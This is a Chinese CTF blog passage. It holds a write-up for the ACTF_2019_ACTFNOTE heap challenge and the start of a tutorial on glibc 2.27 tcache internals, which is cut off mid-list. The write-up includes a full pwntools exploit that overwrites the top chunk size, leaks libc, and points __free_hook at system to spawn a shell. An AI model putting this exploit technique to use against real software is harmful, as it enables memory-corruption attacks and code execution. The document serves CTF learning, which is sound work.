<h2 id="ACTF-2019-ACTFNOTE"><a href="#ACTF-2019-ACTFNOTE" class="headerlink" title="ACTF_2019_ACTFNOTE"></a>ACTF_2019_ACTFNOTE</h2><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>相关结构体：</p>
<img data-src="../images/image-20250410214807265.png" alt="image-20250410214807265" style="zoom: 50%;" />

<p>edit()函数中存在溢出漏洞：</p>
<p><img data-src="/../images/image-20250410215136768.png" alt="image-20250410215136768"></p>
<p>free和show中无漏洞</p>
<p>add()函数如下:</p>
<p><img data-src="/../images/image-20250410215229919.png" alt="image-20250410215229919"></p>
<p><strong>利用思路：</strong></p>
<ul>
<li>通过溢出漏洞改top_chunk的size，为 -1</li>
<li>top_chunk上移至存放指针的结构体，修改结构体中content的指针，实现任意地址读写</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-10 22:00:36</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;/$ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;please input note name size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;please input note name: &#x27;</span>,name)</span><br><span class="line">    sa(<span class="string">b&#x27;please input note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;please input new note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x17</span>+<span class="string">b&#x27;s&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa\n&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;ds&#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x7b61e</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>,<span class="string">b&#x27;b\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#top chunk上移形成overlap chunk</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">##这里要注意因为程序strdup申请出来的空间是与content重合了</span></span><br><span class="line"><span class="comment">##此处内存不能写，所以这个第三个参数必须为空</span></span><br><span class="line">add(-<span class="number">0x80</span>,p64(free_hook),<span class="string">b&#x27;&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache attack</title>
    <url>/2025/03/26/tcache_attack/</url>
    <content><![CDATA[<p>文章是在初次学习tcache_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu18.04</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>cache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<blockquote>
<p>主要参考了 glibc 2.27源码，</p>
</blockquote>
<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
<p>这其实和 fastbin 很像，但又不一样。</p>
<h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用<strong>单向链表</strong>的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，<strong>每条链上最多可以有 7 个 chunk</strong>。</li>
</ul>
<p>用图表示大概是：</p>
<p><img data-src="/../images/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="img"></p>
<h3 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（<strong>默认是 7 个</strong>）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（<strong>不取消 inuse bit</strong>）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk**，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中**，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk</li>
<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次</li>
<li>这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)</li>
</ol>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>接下来从2.27源码的角度分析一下 tcache。</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">// 根据 size 得到的 idx 在合法的范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// tcache-&gt;entries[tc_idx] 有 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>其中 <code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>，直接查看 <code>tcache_init()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_init()</code> 成功返回后，<code>tcache_perthread_struct</code> 就被成功建立了。</p>
<h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><p>接下来将进入申请内存的步骤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>看一下 <code>tcache_get()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h4><p>看完申请，再看看有 tcache 时的释放</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h4><p>跟进 <code>_int_free()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是<strong>要释放的 chunk</strong> 和<strong>该 chunk 对应的 size 在 tcache 中的下标</strong>。</p>
<h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>上面的应该是glibc2.27的源码，来自ctf-wiki</p>
<p>首先，来理解一下新增的两个结构体<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p>
<h4 id="tcache-entry-1"><a href="#tcache-entry-1" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>这里的<code>t</code>是 thread即线程，<code>cache</code> 是缓存，<code>entry</code>是条目，所以顾名思义 tcache_entry 就是线程缓存的条目。</p>
<p>条目是什么意思呢？如下：</p>
<ol>
<li><p><strong>文献和书籍</strong>：在字典、百科全书、参考书籍等中，“条目”指的是对某一特定词汇、概念或主题的解释或描述。例如，字典中的每一个词汇及其定义都可以称为一个条目。</p>
</li>
<li><p><strong>清单和目录</strong>：在清单或目录中，“条目”指的是其中的各个项目或元素，比如商品清单中的每一项商品都可以被称为一个条目。</p>
</li>
<li><p><strong>数据库</strong>：在数据库管理中，一个“条目”指的是数据库中的一条记录，通常包含多个字段的信息。</p>
</li>
</ol>
<p>总之，“条目”强调的是在某个系统或结构中被标识和记录的一个单位，通常与其他条目一起形成一个完整的集合。</p>
<hr>
<p><img data-src="/../images/image-20250320214550152.png" alt="image-20250320214550152"></p>
<p>这个tcache_entry就应该是像上面这样的单链表结构，</p>
<h4 id="tcache-perthread-struct-1"><a href="#tcache-perthread-struct-1" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>这个的意思就是 每个线程的线程缓存的结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个线程都有一个这样的结构体，它包含了每个线程的缓存（因此称为“tcache_perthread_struct”）。</p>
<p>Glibc在2.26中加入了tcache，它对每个线程增加一个bin缓存，这样能显著提高性能，默认情况下，<strong>每个线程有64个bins，以16(8)递增，msize从24(12)到1032(516)</strong>。</p>
<ul>
<li><code>char counts[TCACHE_MAX_BINS];</code><ul>
<li><code>counts</code> 数组用于跟踪每个 bins 中已分配块的数量。每个索引对应于一个特定大小的内存块。</li>
</ul>
</li>
<li><code>tcache_entry *entries[TCACHE_MAX_BINS];</code><ul>
<li><code>entries</code> 数组用于存储指向 chunk 的指针。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>TCACHE_MAX_BINS</code> 被定义为 64，表示缓存可以有最多 64 个bins。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__thread</code> 关键字用于声明 <code>tcache</code> 为线程局部存储变量，这意味着每个线程都有自己独立的 <code>tcache</code> 实例。</li>
<li><code>tcache</code> 初始化为 <code>NULL</code>，表示还没有为其分配内存或没有初始化。</li>
</ul>
<h4 id="tcache-init-1"><a href="#tcache-init-1" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>在这个函数中注意到这两行代码<code>const size_t bytes = sizeof (tcache_perthread_struct); victim = _int_malloc (ar_ptr, bytes);</code></p>
<p>在第一次调用 malloc() 时，系统分配 heap 区域后分配了一个大小为<code>sizeof(tcache_perthread_struct) = 0x241(583)</code>的chunk，它就是每个线程中用于 tcache 机制的一块内存空间。</p>
<h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>在<code>__libc_malloc()</code>开头被调用，这个就是用于从 tcache 中获取一个被 free 的 chunk。</p>
<h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><p>在<code>_int_free()</code>中被调用，这个用于将一个内存块放回tcache中。</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><h5 id="什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？"><a href="#什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？" class="headerlink" title="什么情况下会调用 tcache_get 函数数值（什么情况下会到 tcache 中查找 chunk）？"></a>什么情况下会调用 <code>tcache_get</code> 函数数值（什么情况下会到 tcache 中查找 chunk）？</h5><ol>
<li>在调用 <code>malloc_hook</code> 之前，<code>int_malloc</code> 之前，如果 <code>tcache</code> 中有合适的 chunk，那么就从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code>，若 <code>tcache bin</code> 有对应大小的 chunk，从 <code>tcache</code> 中取出：</li>
